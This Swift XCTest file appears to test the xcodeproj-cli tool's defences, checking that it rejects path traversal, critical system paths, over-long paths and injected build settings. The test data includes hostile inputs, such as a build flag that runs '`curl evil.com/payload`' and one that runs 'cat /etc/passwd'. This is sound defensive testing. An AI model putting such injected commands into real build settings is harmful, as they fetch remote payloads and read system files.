import XCTest
import Foundation

final class SecurityTests: XCTestCase {
    
    static var binaryPath: URL {
        return productsDirectory.appendingPathComponent("xcodeproj-cli")
    }
    
    override class func setUp() {
        super.setUp()
        // Binary path is now computed, no need to set it
    }
    
    // MARK: - Path Traversal Tests
    
    func testBlocksPathTraversal() throws {
        let dangerousPaths = [
            "../../etc/passwd",
            "../../../System/Library",
            "../../../../private/etc",
            "..\\..\\Windows\\System32"
        ]
        
        for path in dangerousPaths {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()
            
            XCTAssertNotEqual(process.terminationStatus, 0, "Should reject path traversal: \(path)")
            
            // Error messages go to stdout in this CLI tool
            let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: outputData, encoding: .utf8) ?? ""
            XCTAssertTrue(
                output.contains("Invalid file path") || output.contains("Error") || output.contains("Invalid"), 
                "Should show error for dangerous path: \(path). Got: \(output)"
            )
        }
    }
    
    func testBlocksURLEncodedTraversal() throws {
        let encodedPaths = [
            "%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%2f..%2fetc",
            "%2e%2e%5c%2e%2e%5cwindows"
        ]
        
        for path in encodedPaths {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp", 
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()
            
            XCTAssertNotEqual(process.terminationStatus, 0, "Should reject encoded traversal: \(path)")
        }
    }
    
    func testBlocksCriticalSystemPaths() throws {
        let criticalPaths = [
            "/etc/passwd",
            "/etc/shadow",
            "/System/Library/LaunchDaemons",
            "/usr/bin/sudo",
            "/private/etc/sudoers"
        ]
        
        for path in criticalPaths {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp", 
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            try process.run()
            process.waitUntilExit()
            
            XCTAssertNotEqual(process.terminationStatus, 0, "Should block critical path: \(path)")
        }
    }
    
    func testAllowsLegitimateProjectPaths() throws {
        let legitimatePaths = [
            "Sources/MyApp/AppDelegate.swift",
            "Resources/Assets.xcassets",
            "Tests/MyAppTests.swift"
        ]
        
        for path in legitimatePaths {
            // Create a temporary file for testing
            let testDir = URL(fileURLWithPath: "Tests/xcodeproj-cliTests/TestResources")
            let filePath = testDir.appendingPathComponent(path)
            
            // Create directories if needed
            try FileManager.default.createDirectory(
                at: filePath.deletingLastPathComponent(),
                withIntermediateDirectories: true,
                attributes: nil
            )
            
            // Create the file
            try "// Test".write(to: filePath, atomically: true, encoding: .utf8)
            defer { try? FileManager.default.removeItem(at: filePath) }
            
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()
            
            // Check that it's not rejected for security reasons
            let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: outputData, encoding: .utf8) ?? ""
            
            // Should not contain security-related error messages
            XCTAssertFalse(
                output.contains("Invalid file path") && output.contains("dangerous"), 
                "Should not reject legitimate path as dangerous: \(path). Got: \(output)"
            )
        }
    }
    
    // MARK: - Build Settings Security Tests
    
    func testBlocksDangerousBuildSettings() throws {
        let dangerousSettings = [
            ("OTHER_LDFLAGS", "\"-Xlinker @executable_path/../../../etc/passwd\""),
            ("OTHER_SWIFT_FLAGS", "\"-Xcc -D$(shell cat /etc/passwd)\""),
            ("OTHER_CFLAGS", "\"-DVALUE=`curl evil.com/payload`\""),
            ("LD_RUNPATH_SEARCH_PATHS", "\"@loader_path/../../../../usr/bin\"")
        ]
        
        for (key, value) in dangerousSettings {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "set-build-setting", key, value,
                "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()
            
            // Check if the dangerous setting was properly rejected
            let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: outputData, encoding: .utf8) ?? ""
            
            // Dangerous settings should be rejected
            XCTAssertNotEqual(process.terminationStatus, 0, "Should reject dangerous setting: \(key)=\(value)")
            XCTAssertTrue(
                output.contains("potentially dangerous") || output.contains("Error") || output.contains("Invalid"),
                "Should show security error for dangerous setting \(key)=\(value). Got: \(output)"
            )
        }
    }
    
    func testAllowsSafeBuildSettings() throws {
        let safeSettings = [
            ("SWIFT_VERSION", "5.9"),
            ("PRODUCT_NAME", "MyApp"),
            ("DEVELOPMENT_TEAM", "ABC123XYZ"),
            ("CODE_SIGN_IDENTITY", "iPhone Developer")
        ]
        
        for (key, value) in safeSettings {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "set-build-setting", key, value,
                "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            try process.run()
            process.waitUntilExit()
            
            XCTAssertEqual(process.terminationStatus, 0, "Should allow safe setting: \(key)=\(value)")
        }
    }
    
    // MARK: - Path Length Tests
    
    func testRejectsExtremelyLongPaths() throws {
        let longPath = String(repeating: "a", count: 2000) + ".swift"
        
        let process = Process()
        process.executableURL = Self.binaryPath
        process.arguments = [
            "add-file", longPath, "--group", "Sources", "--targets", "TestApp",
            "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
        ]
        
        let outputPipe = Pipe()
        let errorPipe = Pipe()
        process.standardOutput = outputPipe
        process.standardError = errorPipe
        
        try process.run()
        process.waitUntilExit()
        
        let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
        let output = String(data: outputData, encoding: .utf8) ?? ""
        
        XCTAssertNotEqual(process.terminationStatus, 0, "Should reject extremely long paths")
        XCTAssertTrue(
            output.contains("too long") || output.contains("maximum") || output.contains("Invalid") || output.contains("Error"),
            "Should show appropriate error message for long path. Got: \(output)"
        )
    }
    
    // MARK: - Private Helpers
    
    static var productsDirectory: URL {
        #if os(macOS)
        for bundle in Bundle.allBundles where bundle.bundlePath.hasSuffix(".xctest") {
            return bundle.bundleURL.deletingLastPathComponent()
        }
        fatalError("couldn't find the products directory")
        #else
        return Bundle.main.bundleURL
        #endif
    }
}